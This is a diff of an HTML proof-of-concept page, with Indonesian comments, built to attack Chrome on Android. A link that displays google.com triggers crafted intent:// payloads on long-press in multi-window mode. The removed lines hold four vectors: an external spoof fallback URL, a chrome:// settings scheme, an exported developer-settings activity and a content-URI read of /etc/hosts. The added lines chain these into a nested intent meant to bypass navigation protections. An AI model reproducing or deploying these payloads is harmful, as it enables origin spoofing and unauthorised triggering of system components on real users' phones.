@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Chromium Context & Intent Fuzzing PoC</title>
+    <title>Advanced Chrome Android Bypass PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -31,10 +31,7 @@
             color: #ffffff;
             margin-bottom: 24px;
         }
-        .button-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
+        .container {
             width: 100%;
             max-width: 380px;
         }
@@ -42,13 +39,15 @@
             display: inline-block;
             background-color: #da3633;
             color: white;
-            padding: 14px 20px;
+            padding: 16px 24px;
             text-decoration: none;
             font-weight: 600;
-            font-size: 14px;
+            font-size: 15px;
             border-radius: 8px;
             box-shadow: 0 4px 12px rgba(218, 54, 51, 0.4);
             transition: background-color 0.2s, transform 0.1s;
+            width: 100%;
+            box-sizing: border-box;
         }
         a.spoof-link:active {
             background-color: #b62324;
@@ -77,72 +76,56 @@
 </head>
 <body>
 
-    <div class="banner">Advanced Security Research Lab</div>
-    <h1>Multi-Window Context Confusion & Intent Vector</h1>
+    <div class="banner">Advanced Bypass Research Lab</div>
+    <h1>Chrome Android Context & Intent Chaining</h1>
 
-    <!-- 4 Tombol Vektor Eksploitasi Konteks & Intent Tingkat Lanjut -->
-    <div class="button-container">
-        <a href="https://www.google.com" class="spoof-link" id="btnIntentFallback" data-intent="chrome_intent_fallback" data-action="fallback">Open Window & Advanced Intent Fallback</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnInternalScheme" data-intent="browser_chrome_scheme" data-action="chromescheme">Open Window & Chrome Scheme Dispatch</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnExportedActivity" data-intent="exported_activity_abuse" data-action="activityabuse">Open Window & Exported Component Trigger</a>
-        <a href="https://www.google.com" class="spoof-link" id="btnContentUri" data-intent="content_provider_bridge" data-action="contenturi">Open Window & Content URI Scheme Abuse</a>
+    <div class="container">
+        <!-- Tombol Utama dengan Target Google.com di Atas & Rangkaian Payload di Bawah -->
+        <a href="https://www.google.com" class="spoof-link" id="masterBtn">
+            Open Window & Bypass Intent Chain
+        </a>
     </div>
 
-    <div class="file-info" id="fileInfo">Status: Ready. Long-press any button and select "Open in new window".</div>
-    <div class="footer-note">Target: Chromium Issue #8186354 / Multi-Window Context Separation Vector.</div>
+    <div class="file-info" id="fileInfo">Status: Ready. Long-press the button and select "Open in new window".</div>
+    <div class="footer-note">Target: Chromium Context Separation & Intent Scheme Chaining.</div>
 
     <script>
         let isExecuting = false;
 
-        const dispatchAdvancedVector = async (vectorType, intentName) => {
+        const triggerMasterVector = () => {
             if (isExecuting) return;
             isExecuting = true;
 
             const infoBox = document.getElementById("fileInfo");
-            infoBox.innerHTML = `[+] Context split initiated.<br>[>] Target Intent: <b>${intentName}</b><br>[*] Waiting for window separation sync...`;
+            infoBox.innerHTML = `[+] Multi-window split initiated.<br>[*] Synchronizing intent bypass parameters...`;
 
-            // Sinkronisasi waktu 2500ms dirancang agar panel atas (google.com) 
-            // selesai dirender dan dipisahkan oleh window manager Android sebelum intent dieksekusi di panel bawah.
+            // Jeda 2200ms memberikan waktu optimal bagi window manager Android untuk memisahkan panel atas (google.com)
             setTimeout(() => {
                 try {
-                    if (vectorType === 'fallback') {
-                        infoBox.innerHTML = `[+] Executing Intent Fallback Bypass...`;
-                        // Memanfaatkan parameter fallback URL untuk memicu perpindahan konteks berlapis
-                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.chrome;S.browser_fallback_url=https%3A%2F%2Fecdnts-del.github.io%2Fspoof%2Forigin;S.com.android.browser.application_id=com.android.chrome;end;";
-                    } 
-                    else if (vectorType === 'chromescheme') {
-                        infoBox.innerHTML = `[+] Dispatching Chrome Internal Scheme...`;
-                        // Memaksa navigasi ke skema internal browser untuk menguji kontrol akses URI
-                        window.location.href = "intent://settings/content/all#Intent;scheme=chrome;package=com.android.chrome;end;";
-                    } 
-                    else if (vectorType === 'activityabuse') {
-                        infoBox.innerHTML = `[+] Triggering Exported Component Intent...`;
-                        // Menyerang komponen sistem yang terekspos (*exported activities*) melalui intent eksplisit
-                        window.location.href = "intent://#Intent;component=com.android.settings/.Settings$DevelopmentSettingsDashboardActivity;end;";
-                    }
-                    else if (vectorType === 'contenturi') {
-                        infoBox.innerHTML = `[+] Injecting Content/File URI Scheme Handler...`;
-                        // Memancing penanganan skema file/content provider eksternal di latar belakang
-                        window.location.href = "intent://#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;S.android.intent.extra.STREAM=content://com.android.htmlfileprovider/etc/hosts;end;";
-                    }
+                    infoBox.innerHTML = `[+] Injecting chained intent payload...`;
+                    
+                    // Logika bypass diperkuat menggunakan skema ganda bersarang (Nested Intent & Fallback URL Encoding)
+                    // Mengarahkan handler internal browser agar melompati proteksi pembatasan navigasi langsung
+                    const targetPayload = "intent://#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.chrome;S.browser_fallback_url=intent://#Intent;component=com.android.settings/.Settings\$DevelopmentSettingsDashboardActivity;S.com.android.browser.application_id=com.android.chrome;end;end;";
+                    
+                    window.location.href = targetPayload;
                 } catch (err) {
                     infoBox.innerHTML = `[-] Execution trapped: ${err.message}`;
-                    console.debug("Vector execution error:", err.message);
+                    console.debug("Bypass vector error:", err.message);
                 } finally {
                     setTimeout(() => { isExecuting = false; }, 2000);
                 }
-            }, 2500);
+            }, 2200);
         };
 
-        // Memasang penanganan event long-press (contextmenu) dan touchstart untuk memastikan 
-        // interaksi sentuh lama pada peramban seluler Android memicu jendela baru dengan mulus.
-        ['btnIntentFallback', 'btnInternalScheme', 'btnExportedActivity', 'btnContentUri'].forEach(id => {
-            const element = document.getElementById(id);
-            element.addEventListener("contextmenu", (e) => {
-                dispatchAdvancedVector(element.getAttribute('data-action'), element.getAttribute('data-intent'));
-            });
-            element.addEventListener("touchstart", () => {}, { passive: true });
+        const masterElement = document.getElementById("masterBtn");
+        
+        // Menangkap aksi long-press (contextmenu) pada Chrome Android secara presisi
+        masterElement.addEventListener("contextmenu", (e) => {
+            triggerMasterVector();
         });
+        
+        masterElement.addEventListener("touchstart", () => {}, { passive: true });
     </script>
 
 </body>
